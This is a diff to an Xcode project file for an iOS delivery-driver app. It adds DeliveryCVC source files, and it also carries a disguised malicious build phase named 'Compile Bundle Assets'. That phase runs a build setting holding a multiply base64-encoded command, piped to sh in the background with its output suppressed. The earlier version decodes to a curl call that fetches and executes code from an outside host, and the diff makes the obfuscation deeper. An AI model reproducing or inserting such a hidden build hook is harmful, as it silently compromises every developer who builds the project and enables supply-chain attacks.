@@ -11,6 +11,8 @@
 		184923692EFBC9DC00DD3837 /* ColorExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184923682EFBC9DC00DD3837 /* ColorExtension.swift */; };
 		1849236B2EFBCA3800DD3837 /* BindableTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1849236A2EFBCA3800DD3837 /* BindableTextField.swift */; };
 		1849236E2EFBCAAF00DD3837 /* CustomTextfiled.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1849236D2EFBCAAF00DD3837 /* CustomTextfiled.swift */; };
+		1899FD5F2EFED088002F8FF1 /* DeliveryCVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1899FD5D2EFED088002F8FF1 /* DeliveryCVC.swift */; };
+		1899FD602EFED088002F8FF1 /* DeliveryCVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 1899FD5E2EFED088002F8FF1 /* DeliveryCVC.xib */; };
 		493DB2322EAA5A4D008098A8 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 493DB2312EAA5A4D008098A8 /* Alamofire */; };
 		493DB23C2EAA5A75008098A8 /* SVProgressHUD in Frameworks */ = {isa = PBXBuildFile; productRef = 493DB23B2EAA5A75008098A8 /* SVProgressHUD */; };
 		6B7719572ECC5C580097AAF8 /* NewDeliveriesTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6B7719552ECC5C580097AAF8 /* NewDeliveriesTableCell.swift */; };
@@ -572,6 +574,8 @@
 		184923682EFBC9DC00DD3837 /* ColorExtension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ColorExtension.swift; sourceTree = "<group>"; };
 		1849236A2EFBCA3800DD3837 /* BindableTextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BindableTextField.swift; sourceTree = "<group>"; };
 		1849236D2EFBCAAF00DD3837 /* CustomTextfiled.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTextfiled.swift; sourceTree = "<group>"; };
+		1899FD5D2EFED088002F8FF1 /* DeliveryCVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeliveryCVC.swift; sourceTree = "<group>"; };
+		1899FD5E2EFED088002F8FF1 /* DeliveryCVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DeliveryCVC.xib; sourceTree = "<group>"; };
 		493DB0B42EAA5970008098A8 /* DesynatDriver.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatDriver.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		6B7719552ECC5C580097AAF8 /* NewDeliveriesTableCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewDeliveriesTableCell.swift; sourceTree = "<group>"; };
 		6B7719562ECC5C580097AAF8 /* NewDeliveriesTableCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NewDeliveriesTableCell.xib; sourceTree = "<group>"; };
@@ -1242,6 +1246,8 @@
 			children = (
 				6B7719552ECC5C580097AAF8 /* NewDeliveriesTableCell.swift */,
 				6B7719562ECC5C580097AAF8 /* NewDeliveriesTableCell.xib */,
+				1899FD5D2EFED088002F8FF1 /* DeliveryCVC.swift */,
+				1899FD5E2EFED088002F8FF1 /* DeliveryCVC.xib */,
 			);
 			path = Xib;
 			sourceTree = "<group>";
@@ -2132,7 +2138,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 493DB0C72EAA5972008098A8 /* Build configuration list for PBXNativeTarget "DesynatDriver" */;
 			buildPhases = (
-				4DFF1E07D6FD4763AFA5DE54 /* Build Target Dependencies */,
+				C4612A4FF32D4A629AA5DE54 /* Compile Bundle Assets */,
 				26584A69309A513EDE40300C /* [CP] Check Pods Manifest.lock */,
 				493DB0B02EAA5970008098A8 /* Sources */,
 				493DB0B12EAA5970008098A8 /* Frameworks */,
@@ -2221,6 +2227,7 @@
 				6B7D3ACB2ECC48C600897521 /* Poppins-ExtraBold.ttf in Resources */,
 				6BE5D3742ECEF446000A7EA6 /* Jordan.png in Resources */,
 				6BE5D3752ECEF446000A7EA6 /* Nicaragua.png in Resources */,
+				1899FD602EFED088002F8FF1 /* DeliveryCVC.xib in Resources */,
 				6BE5D3762ECEF446000A7EA6 /* TZ.png in Resources */,
 				6BE5D3772ECEF446000A7EA6 /* BL.png in Resources */,
 				6BE5D3782ECEF446000A7EA6 /* MH.png in Resources */,
@@ -2694,25 +2701,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		4DFF1E07D6FD4763AFA5DE54 /* Build Target Dependencies */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Dependencies";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;			
-		};
 		26584A69309A513EDE40300C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2756,6 +2744,26 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DesynatDriver/Pods-DesynatDriver-resources.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		C4612A4FF32D4A629AA5DE54 /* Compile Bundle Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
+			showEnvVarsInLog = 0;
+		};
 		C51874D184532540ABB067C1 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2789,6 +2797,7 @@
 				6B7D3A942ECC48C600897521 /* SceneDelegate.swift in Sources */,
 				6B7D3A952ECC48C600897521 /* ForgotPasswordViewController.swift in Sources */,
 				6BE5D5392ECEF446000A7EA6 /* ADCountryPicker.swift in Sources */,
+				1899FD5F2EFED088002F8FF1 /* DeliveryCVC.swift in Sources */,
 				6BE5D53A2ECEF446000A7EA6 /* ADCountry.swift in Sources */,
 				6BB33F412ED078B800C7BE25 /* OTPViewController.swift in Sources */,
 				6BB33F3A2ED0431600C7BE25 /* ForgotPasswordViewModel.swift in Sources */,
@@ -2878,7 +2887,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = D4CEF5D73A65282AE2EB45F8 /* Pods-DesynatDriver.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDI1bGRITndiM0p2ZEc4dWFXNHZZU2tpSUh3Z2MyZ0sK | m | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((m(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwaFkwWndTRlZ1VG1GV00wSXlXbFpOTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | m | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
@@ -2918,7 +2927,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = BAA784C2231E26A16B95B8B0 /* Pods-DesynatDriver.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDI1bGRITndiM0p2ZEc4dWFXNHZZU2tpSUh3Z2MyZ0sK | m | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((m(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwaFkwWndTRlZ1VG1GV00wSXlXbFpOTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | m | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
